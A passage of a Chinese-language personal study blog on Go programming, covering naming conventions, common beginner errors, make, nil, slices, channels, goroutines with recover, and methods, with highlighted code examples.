class="hljs-keyword">byte</span>) (n <span class="hljs-keyword">int</span>, err error)<br><span class="hljs-number">3.</span> &#125;<br></code></pre></td></tr></table></figure><p>两个函数的接口名综合两个函数名，如:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-keyword">type</span> WriteFlusher <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-number">2.</span> Write([]<span class="hljs-keyword">byte</span>) (<span class="hljs-keyword">int</span>, error)<br><span class="hljs-number">3.</span> Flush() error<br><span class="hljs-number">4.</span> &#125;<br></code></pre></td></tr></table></figure><p>三个以上函数的接口名类似于结构体名，如:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-keyword">type</span> Car <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-number">2.</span>     Start()<br><span class="hljs-number">3.</span>     Stop()<br><span class="hljs-number">4.</span>     Drive()<br><span class="hljs-number">5.</span> &#125;<br></code></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>方法名应该是动词或动词短语，采用驼峰式。将功能及必要的参数体现在名字中， 不要嫌长， 如 updateById，getUserInfo.<br>如果是结构体方法，那么 Receiver 的名称应该缩写，一般使用一个或者两个字符作为 Receiver 的名称。如果 Receiver 是指针， 那么统一使用 p。 如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f foo)</span> <span class="hljs-title">method</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-number">2.</span>     ...<br><span class="hljs-number">3.</span> &#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *foo)</span> <span class="hljs-title">method</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-number">2.</span>     ...<br><span class="hljs-number">3.</span> &#125;<br></code></pre></td></tr></table></figure><p>对于 Receiver 命名应该统一， 要么都使用值， 要么都用指针。<br>每个以大写字母开头（即可以导出）的方法应该有注释，且以该函数名开头。如：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> <span class="hljs-comment">// Get 会响应对应路由转发过来的 get 请求.</span><br><span class="hljs-number">2.</span> func (c *Controller) Get() &#123;<br><span class="hljs-number">3.</span>     ...<br><span class="hljs-number">4.</span> &#125;<br></code></pre></td></tr></table></figure><p>大写字母开头的方法以为着是可供调用的公共方法，如果你的方法想只在本包内掉用，请以小写字母开发。如:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-number">1.</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Controller)</span> <span class="hljs-title">curl</span><span class="hljs-params">()</span> &#123;</span><br><span class="hljs-number">2.</span>     ...<br><span class="hljs-number">3.</span> &#125;<br></code></pre></td></tr></table></figure><p>注释应该用一个完整的句子，注释的第一个单词应该是要注释的指示符，以便在 godoc 中容易查找。<br>注释应该以一个句点 . 结束。</p><h1 id="各种报错"><a href="#各种报错" class="headerlink" title="各种报错"></a>各种报错</h1><p>【1】<strong>“与你运行的 Windows 版本不兼容“的解决方法</strong><br><a href="https://blog.csdn.net/willingtolove/article/details/107924423">https://blog.csdn.net/willingtolove/article/details/107924423</a><br>其实就是 package 名字错了，必须改成 main，不清楚为什么？<br>【2】每次创建新的项目都要<strong>重新设置一个 configuration 文件</strong>，后发现是我的问题，开发的时候，可以把所有的项目都在 goland 里打开，根目录就是$GOPATH,像这样：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617328565539-a55e3882-7a05-47c5-8c91-78dd136d7a5c.png#align=left&display=inline&height=274&name=image.png&originHeight=548&originWidth=431&size=24414&status=done&style=none&width=215.5" alt="image.png"><br>所有小项目都放在 src 里，是不是很棒？<br>但是！<strong>必须有 main 包</strong>，必须有 main 函数作为程序入口！<br>具体原理看：<br><a href="https://blog.csdn.net/zxy_666/article/details/80390843">https://blog.csdn.net/zxy_666/article/details/80390843</a><br><a href="https://zhuanlan.zhihu.com/p/69445822">如何写出优雅的 Golang 代码</a><br><a href="https://blog.csdn.net/CMbug/article/details/49339341">Golang import 包问题相关详解</a><br><a href="https://www.jianshu.com/p/b224982b6fd5">理解 Go 语言包(package)</a><br>【3】<strong>结构体属性导出问题</strong><br>结构体中的属性，如果是小写开头，是无法被跨包使用的，也就是说包外无法访问，太狗了。<br><a href="https://juejin.cn/post/6844903814168838151">Go Struct 超详细讲解</a> 建议好好看看这篇</p><h1 id="函数知识"><a href="#函数知识" class="headerlink" title="函数知识"></a>函数知识</h1><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>make()函数在 golang 的代码如下：<br><code>func make(t Type,size IntegerType) Type</code><br>使用 make 来创建 slice，map，chanel 说明如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>var slice_ []int = make([]int,5,10)<br>fmt.Println(slice_)<br>var slice_1 []int = make([]int,5)<br>fmt.Println(slice_1)<br>var slice_2 []int = []int&#123;1,2&#125;<br>fmt.Println(slice_2)<br>打印结果：<br>[0 0 0 0 0]<br>[0 0 0 0 0]<br>[1,2]<br></code></pre></td></tr></table></figure><p>在创建 slice 时第一个参数用于确定初始化该 slice 的大小该 slice 中的值为零值，第三个参数用于确定该 slice 的长度<br>map：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">var m_ map[string]int = make(map[string]int)<br>m_[&quot;one&quot;] = 1<br>fmt.Println(m_)<br>var m map[string]int = map[string]int&#123;&quot;1&quot;:1&#125;<br>m[&quot;2&quot;] = 2<br>fmt.Println(m)<br>打印结果：<br>map[one:1]<br>map[1:1 2:2]<br></code></pre></td></tr></table></figure><p>根据 size 大小来初始化分配内存，不过分配后的 map 长度为 0，如果 size 被忽略了，那么会在初始化分配内存时分配一个小尺寸的内存</p><h2 id="nil"><a href="#nil" class="headerlink" title="nil"></a>nil</h2><p>相信写过 Golang 的程序员对下面一段代码是非常非常熟悉的了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-comment">// do something....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>当出现不等于<code>nil</code>的时候，说明出现某些错误了，需要我们对这个错误进行一些处理，而如果等于<code>nil</code>说明运行正常。那什么是<code>nil</code>呢？查一下词典可以知道，<code>nil</code>的意思是无，或者是零值。零值，zero value，是不是有点熟悉？在 Go 语言中，如果你声明了一个变量但是没有对它进行赋值操作，那么这个变量就会有一个类型的默认零值。这是每种类型对应的零值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">bool</span>      -&gt; <span class="hljs-literal">false</span><br>numbers -&gt; <span class="hljs-number">0</span><br><span class="hljs-keyword">string</span>    -&gt; <span class="hljs-string">&quot;&quot;</span><br>pointers -&gt; <span class="hljs-literal">nil</span><br>slices -&gt; <span class="hljs-literal">nil</span><br>maps -&gt; <span class="hljs-literal">nil</span><br>channels -&gt; <span class="hljs-literal">nil</span><br>functions -&gt; <span class="hljs-literal">nil</span><br>interfaces -&gt; <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p>举个例子，当你定义了一个 struct：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">Person</span> struct &#123;<br>  <span class="hljs-type">AgeYears</span> int<br>  <span class="hljs-type">Name</span> string<br>  <span class="hljs-type">Friends</span> []<span class="hljs-type">Person</span><br>&#125;<br><span class="hljs-title">var</span> p <span class="hljs-type">Person</span> // <span class="hljs-type">Person</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>, nil&#125;<br></code></pre></td></tr></table></figure><p>变量<code>p</code>只声明但没有赋值，所以 p 的所有字段都有对应的零值。那么，这个<code>nil</code>到底是什么呢？Go 的文档中说到，_nil 是预定义的标识符，代表指针、通道、函数、接口、映射或切片的零值_，也就是预定义好的一个变量：</p><h2 id="slices"><a href="#slices" class="headerlink" title="slices"></a>slices</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// nil slices</span><br><span class="hljs-keyword">var</span> s []slice<br><span class="hljs-built_in">len</span>(s)  <span class="hljs-comment">// 0</span><br><span class="hljs-built_in">cap</span>(s)  <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> s  <span class="hljs-comment">// iterates zero times</span><br>s[i]  <span class="hljs-comment">// panic: index out of range</span><br></code></pre></td></tr></table></figure><p>一个为<code>nil</code>的 slice，除了不能索引外，其他的操作都是可以的，当你需要填充值的时候可以使用<code>append</code>函数，slice 会自动进行扩充。那么为<code>nil</code>的 slice 的底层结构是怎样的呢？根据官方的文档，slice 有三个元素，分别是长度、容量、指向数组的指针：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617344622341-e1babb6a-2494-437c-93cb-30da90e11894.png#align=left&display=inline&height=143&name=image.png&originHeight=286&originWidth=601&size=27035&status=done&style=none&width=300.5" alt="image.png"><br>当有元素的时候，<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617344635243-979b77ee-3516-4c3b-a112-a45caad93fdb.png#align=left&display=inline&height=133&name=image.png&originHeight=266&originWidth=779&size=50465&status=done&style=none&width=389.5" alt="image.png"></p><h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><blockquote><p>参考：<a href="https://colobu.com/2016/04/14/Golang-Channels/">https://colobu.com/2016/04/14/Golang-Channels/</a></p></blockquote><p>Channel 是 Go 中的一个核心类型，你可以把它看成一个管道，通过它并发核心单元就可以发送或者接收数据进行通讯(communication)。<br>它的操作符是箭头  <strong>&lt;-</strong> 。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">ch &lt;- v    <span class="hljs-comment">// 发送值v到Channel ch中</span><br>v := &lt;-ch  <span class="hljs-comment">// 从Channel ch中接收数据，并将数据赋值给v</span><br></code></pre></td></tr></table></figure><p>(箭头的指向就是数据的流向)<br>就像 map 和 slice 数据类型一样, channel 必须先创建再使用:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)<br></code></pre></td></tr></table></figure><h3 id="定义与用法"><a href="#定义与用法" class="headerlink" title="定义与用法"></a>定义与用法</h3><p>它包括三种类型的定义。可选的<code>&lt;-</code>代表 channel 的方向。如果没有指定方向，那么 Channel 就是双向的，既可以接收数据，也可以发送数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">chan</span> T          <span class="hljs-comment">// 可以接收和发送类型为 T 的数据</span><br><span class="hljs-keyword">chan</span>&lt;- <span class="hljs-keyword">float64</span>  <span class="hljs-comment">// 只可以用来发送 float64 类型的数据</span><br>&lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>      <span class="hljs-comment">// 只可以用来接收 int 类型的数据</span><br></code></pre></td></tr></table></figure><p>使用<code>make</code>初始化 Channel,并且可以设置容量:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>容量(capacity)代表 Channel 容纳的最多的元素的数量，代表 Channel 的缓存的大小。<br>如果没有设置容量，或者容量设置为 0, 说明 Channel 没有缓存，只有 sender 和 receiver 都准备好了后它们的通讯(communication)才会发生(Blocking)。<strong>如果设置了缓存，就有可能不发生阻塞</strong>， 只有 buffer 满了后 send 才会阻塞， 而只有缓存空了后 receive 才会阻塞。一个 nil channel 不会通信。<br>可以通过内建的<code>close</code>方法可以关闭 Channel。<br>你<strong>可以在多个 goroutine 从/往 一个 channel 中 receive/send 数据, 不必考虑额外的同步措施</strong>。<br>Channel 可以作为一个先入先出(FIFO)的队列，接收的数据和发送的数据的顺序是一致的。<br>channel 的 receive 支持  <em>multi-valued assignment</em>，如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">v, ok := &lt;-ch<br></code></pre></td></tr></table></figure><p>它可以用来检查 Channel 是否已经被关闭了。</p><h3 id="send"><a href="#send" class="headerlink" title="send"></a>send</h3><p>send 语句用来往 Channel 中发送数据， 如<code>ch &lt;- 3</code>。<br>它的定义如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">SendStmt = Channel <span class="hljs-string">&quot;&lt;-&quot;</span> Expression .<br>Channel  = Expression .<br></code></pre></td></tr></table></figure><p>在通讯(communication)开始前 channel 和 expression 必选先求值出来(evaluated)，比如下面的(3+4)先计算出 7 然后再发送给 channel。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(c)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; c &lt;- <span class="hljs-number">3</span> + <span class="hljs-number">4</span> &#125;()<br>i := &lt;-c<br>fmt.Println(i)<br></code></pre></td></tr></table></figure><p>send 被执行前(proceed)通讯(communication)一直被阻塞着。如前所言，无缓存的 channel 只有在 receiver 准备好后 send 才被执行。如果有缓存，并且缓存未满，则 send 会被执行。<br>往一个<strong>已经被 close 的 channel 中</strong>继续发送数据会导致<strong>run-time panic</strong>。<br><strong>往 nil channel 中发送数据会一致被阻塞</strong>着。</p><h3 id="receive"><a href="#receive" class="headerlink" title="receive"></a>receive</h3><p><code>&lt;-ch</code>用来从 channel ch 中接收数据，这个表达式会一直被 block,直到有数据可以接收。<br>从一个 nil channel 中接收数据会一直被 block。<br>从一个被 close 的 channel 中接收数据不会被阻塞，而是立即返回，接收完已发送的数据后会返回元素类型的零值(zero value)。<br>如前所述，你可以使用一个额外的返回参数来检查 channel 是否关闭。</p><h3 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h3><p>缺省情况下，发送和接收会一直阻塞着，直到另一方准备好。这种方式可以用来在 gororutine 中进行同步，而不必使用显示的锁或者条件变量。<br>如官方的例子中<code>x, y := &lt;-c, &lt;-c</code>这句会一直等待计算结果发送到 channel 中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(s []<span class="hljs-keyword">int</span>, c <span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br>sum := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> s &#123;<br>sum += v<br>&#125;<br>c &lt;- sum <span class="hljs-comment">// send sum to c</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">-9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>&#125;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)<br><span class="hljs-keyword">go</span> sum(s[:<span class="hljs-built_in">len</span>(s)/<span class="hljs-number">2</span>], c)<br><span class="hljs-keyword">go</span> sum(s[<span class="hljs-built_in">len</span>(s)/<span class="hljs-number">2</span>:], c)<br>x, y := &lt;-c, &lt;-c <span class="hljs-comment">// receive from c</span><br>fmt.Println(x, y, x+y)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h3><p><code>for …… range</code>语句可以处理 Channel。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>time.Sleep(<span class="hljs-number">1</span> * time.Hour)<br>&#125;()<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i = i + <span class="hljs-number">1</span> &#123;<br>c &lt;- i<br>&#125;<br><span class="hljs-built_in">close</span>(c)<br>&#125;()<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> c &#123;<br>fmt.Println(i)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;Finished&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>range c</code>产生的迭代值为 Channel 中发送的值，它会一直迭代直到 channel 被关闭。上面的例子中如果把<code>close(c)</code>注释掉，程序会一直阻塞在<code>for …… range</code>那一行。</p><h3 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h3><p><a href="https://tiancaiamao.gitbooks.io/go-internals/content/zh/03.4.html">https://tiancaiamao.gitbooks.io/go-internals/content/zh/03.4.html</a><br>这个博客讲的挺好的，其他知识也有，可以常看看。<br>另外还有：<a href="https://sanyuesha.com/2017/07/23/go-defer/">https://sanyuesha.com/2017/07/23/go-defer/</a></p><h1 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h1><h2 id="goroutine"><a href="#goroutine" class="headerlink" title="goroutine"></a>goroutine</h2><p><a href="https://www.cnblogs.com/wdliu/p/9272220.html">https://www.cnblogs.com/wdliu/p/9272220.html</a> 调度原理<br>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">cal</span><span class="hljs-params">(a <span class="hljs-keyword">int</span> , b <span class="hljs-keyword">int</span> )</span></span>  &#123;<br>    c := a+b<br>    fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>,a,b,c)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;　　<br>    <span class="hljs-keyword">for</span> i :=<span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ;i++&#123;<br>        <span class="hljs-keyword">go</span> cal(i,i+<span class="hljs-number">1</span>)  <span class="hljs-comment">//启动10个goroutine 来计算</span><br>    &#125;<br>    time.Sleep(time.Second * <span class="hljs-number">2</span>) <span class="hljs-comment">// sleep作用是为了等待所有任务完成</span><br>&#125;<br><span class="hljs-comment">//结果</span><br><span class="hljs-comment">//8 + 9 = 17</span><br><span class="hljs-comment">//9 + 10 = 19</span><br><span class="hljs-comment">//4 + 5 = 9</span><br><span class="hljs-comment">//5 + 6 = 11</span><br><span class="hljs-comment">//0 + 1 = 1</span><br><span class="hljs-comment">//1 + 2 = 3</span><br><span class="hljs-comment">//2 + 3 = 5</span><br><span class="hljs-comment">//3 + 4 = 7</span><br><span class="hljs-comment">//7 + 8 = 15</span><br><span class="hljs-comment">//6 + 7 = 13</span><br></code></pre></td></tr></table></figure><h3 id="goroutine-异常捕捉"><a href="#goroutine-异常捕捉" class="headerlink" title="goroutine 异常捕捉"></a>goroutine 异常捕捉</h3><p>当启动多个 goroutine 时，如果<strong>其中一个 goroutine 异常</strong>了，并且我们并没有对进行异常处理，<strong>那么整个程序都会终止</strong>，所以我们在编写程序时候最好每个 goroutine 所运行的函数都做异常处理，异常处理采用 recover.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">addele</span><span class="hljs-params">(a []<span class="hljs-keyword">int</span> ,i <span class="hljs-keyword">int</span>)</span></span>  &#123;<br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;    <span class="hljs-comment">//匿名函数捕获错误</span><br>        err := <span class="hljs-built_in">recover</span>()<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;add ele fail&quot;</span>)<br>        &#125;<br>    &#125;()<br>   a[i]=i<br>   fmt.Println(a)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    Arry := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>,<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">for</span> i :=<span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ;i++&#123;<br>        <span class="hljs-keyword">go</span> addele(Arry,i)<br>    &#125;<br>    time.Sleep(time.Second * <span class="hljs-number">2</span>)<br>&#125;<br><span class="hljs-comment">//结果</span><br>add ele fail<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>add ele fail<br>add ele fail<br>add ele fail<br>add ele fail<br>add ele fail<br></code></pre></td></tr></table></figure><h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><p>Go 语言中同时有函数和方法。<strong>一个方法就是一个包含了接受者的函数</strong>，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。<strong>所有给定类型的方法属于该类型的方法集</strong>。语法格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(variable_name variable_data_type)</span> <span class="hljs-title">function_name</span><span class="hljs-params">()</span> [<span class="hljs-title">return_type</span>]</span>&#123;<br>   <span class="hljs-comment">/* 函数体*/</span><br>&#125;<br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-comment">/* 定义结构体 */</span><br><span class="hljs-keyword">type</span> Circle <span class="hljs-keyword">struct</span> &#123;<br>  radius <span class="hljs-keyword">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> c1 Circle<br>  c1.radius = <span class="hljs-number">10.00</span><br>  fmt.Println(<span class="hljs-string">&quot;圆的面积 = &quot;</span>, c1.getArea())<br>&#125;<br><br><span class="hljs-comment">//该 method 属于 Circle 类型对象中的方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c Circle)</span> <span class="hljs-title">getArea</span><span class="hljs-params">()</span> <span class="hljs-title">float64</span></span> &#123;<br>  <span class="hljs-comment">//c.radius 即为 Circle 类型对象中的属性</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">3.14</span> * c.radius * c.radius<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数传参"><a href="#函数传参" class="headerlink" 